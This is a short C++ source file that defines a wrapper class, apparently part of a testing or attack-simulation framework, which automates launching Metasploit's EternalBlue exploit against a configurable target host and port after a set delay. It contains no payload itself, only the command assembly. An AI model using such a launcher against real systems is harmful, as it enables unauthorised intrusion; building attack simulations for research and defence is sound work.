//
// Created by philipp on 20.02.19.
//


#include <sstream>
#include "Metasploit_External.h"

class MSF_EternalBlue : public Metasploit_External {
public:
    MSF_EternalBlue(unsigned int id,
                    unsigned int startDelaySec,
                    unsigned int durationSec,
                    const std::string &targetHost,
                    unsigned int targetPort,
                    const std::string &exploitName)
            : Metasploit_External(id, startDelaySec, durationSec, targetHost, targetPort, exploitName) {}

private:
    void get_msf_arguments() override {
        std::string commands;
        getCommandString(commands);
        inputArguments = {MSF_FILE,
                          MSF_QUIET_FLAG,
                          MSF_COMMAND_FLAG,
                          commands
        };
    };

    int getCommandString(std::string &command) {
        std::stringstream commandStrStr{};
        commandStrStr <<
                      getUseCommand(exploitName)
                      << getRhostsCommand(targetHost)
                      << getRPortCommand(targetPort)
                      << MSF_EXPLOIT_COMMAND;
        command = commandStrStr.str();
        return 0;
    }
};
